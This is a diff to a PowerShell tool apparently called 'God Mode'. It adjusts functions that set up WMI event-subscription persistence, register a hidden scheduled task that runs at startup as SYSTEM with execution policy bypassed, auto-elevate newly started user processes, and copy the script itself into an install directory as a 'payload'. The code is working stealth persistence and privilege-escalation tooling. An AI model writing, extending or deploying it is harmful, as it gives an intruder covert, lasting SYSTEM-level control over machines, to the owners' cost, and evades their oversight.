@@ -1097,7 +1097,7 @@ if %errorlevel% equ 0 (
             $Output = ($ResultText -replace "___SUCCESS___", "" -replace "___FAILED___", "").Trim()
             Remove-Item -Path $ResultFile -Force -ErrorAction SilentlyContinue
         }
-        Remove-Item -Path $BatchFile -Force -ErrorAction SilentlyContinue
+        if (Test-Path $BatchFile) { Remove-Item -Path $BatchFile -Force -ErrorAction SilentlyContinue }
         if ($Completed) {
             Write-Log -Message "[DEBUG] SYSTEM task $TempTaskName completed. Success=$Success" -Type "INFO" -Color Yellow
             return [PSCustomObject]@{ Success = $Success; Output = $Output }
@@ -1536,7 +1536,8 @@ function Uninstall-Persistence {
 
 function Test-BuiltInAdmin {
     $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
-    return ($sid -like "*-500")
+    # Allow both Built-in Administrator (SID ending in -500) and SYSTEM (S-1-5-18)
+    return ($sid -like "*-500" -or $sid -eq "S-1-5-18")
 }
 
 function Test-SystemContext {
@@ -1872,7 +1873,7 @@ function Register-DeepPersistence {
             Name = $WmiName
             EventNamespace = "root\cimv2"
             QueryLanguage = "WQL"
-            Query = "SELECT * FROM Win32_ProcessStartupTrace WITHIN 60"
+            Query = "SELECT * FROM Win32_ProcessStartupTrace"
         } -ErrorAction SilentlyContinue
         $ConsumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
             Name = $WmiName
@@ -2203,7 +2204,7 @@ function Register-StealthTask {
         -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -Launch"
 
     $trigger = New-ScheduledTaskTrigger -AtStartup
-    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
+    $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" `
         -LogonType ServiceAccount -RunLevel Highest
 
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
@@ -2308,10 +2309,12 @@ function Start-Monitoring {
             }
 
             # --- New Process Elevation ---
+            # Only elevate processes in user sessions (SessionId > 0) to avoid duplicating system processes
             $Now = Get-Date
             $newProcesses = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object {
                 try {
-                    $_.CreationDate -and 
+                    $_.SessionId -gt 0 -and
+                    $_.CreationDate -and
                     ([System.Management.ManagementDateTimeConverter]::ToDateTime($_.CreationDate)) -gt $Now.AddSeconds(-10)
                 } catch { $false }
             }
@@ -2356,6 +2359,14 @@ function Start-Monitoring {
 
 function Enable-GodMode {
     Write-DebugLog -FunctionName "Enable-GodMode" -Action "ENTRY"
+
+    # Ensure the installed script exists before registering tasks that depend on it
+    if (-not (Test-Path $GodModeInstallScript)) {
+        Write-Log -Message "God Mode install script not found. Copying payload to $GodModeInstallScript..." -Type "INFO" -Color Yellow
+        if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }
+        Copy-Item -Path $PSCommandPath -Destination $GodModeInstallScript -Force
+    }
+
     if (-not (Test-Path $GodModeFlagRegPath)) { New-Item -Path $GodModeFlagRegPath -Force | Out-Null }
     Set-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -Value 1 -Force -ErrorAction SilentlyContinue
     Register-StealthTask
